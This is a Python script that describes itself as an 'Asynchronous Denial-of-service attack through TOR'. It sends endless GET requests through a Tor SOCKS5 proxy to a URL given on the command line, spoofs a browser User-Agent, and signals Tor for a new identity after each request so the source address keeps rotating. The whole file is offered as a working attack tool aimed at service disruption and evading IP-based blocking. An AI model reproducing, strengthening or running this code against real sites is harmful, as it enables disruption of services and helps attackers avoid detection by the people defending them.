import asyncio

import aiohttp

from aiohttp_socks import ProxyType, ProxyConnector

from stem import Signal

from stem.control import Controller

import argparse

import re


PROTOCOL_PATTERN = '^(?:https?:\/\/)?(?:www\.)?'

URL = 'https://ident.me'

PROXY_HOST = 'localhost'

PROXY_PORT = 9050


async def main(url: str, proxy_host: str = PROXY_HOST, proxy_port: str = PROXY_PORT):
    while True:
        # Proxy
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=proxy_host,
            port=proxy_port,
            rdns=True
        )

        # HTTP session
        session = aiohttp.ClientSession(connector=connector)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'Connection:': 'keep-alive',
        }

        async with session.get(url, headers=headers) as response:
            print(f'Request to {re.sub(PROTOCOL_PATTERN, "", url)} made through {await response.text()} has a {response.status} status code')

        await session.close()

        # New identity
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()

            controller.signal(Signal.NEWNYM)


def runner(args: argparse.Namespace):
    loop = asyncio.get_event_loop()

    loop.create_task(main(args.url, args.proxy_host, args.proxy_port))

    loop.run_forever()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Asynchronous Denial-of-service attack through TOR.')

    parser.add_argument(
        '--url',
        default=URL,
        type=str
    )
    parser.add_argument(
        '--proxy_host',
        default=PROXY_HOST,
        type=str
    )
    parser.add_argument(
        '--proxy_port',
        default=PROXY_PORT,
        type=int
    )

    args = parser.parse_args()
    
    runner(args)
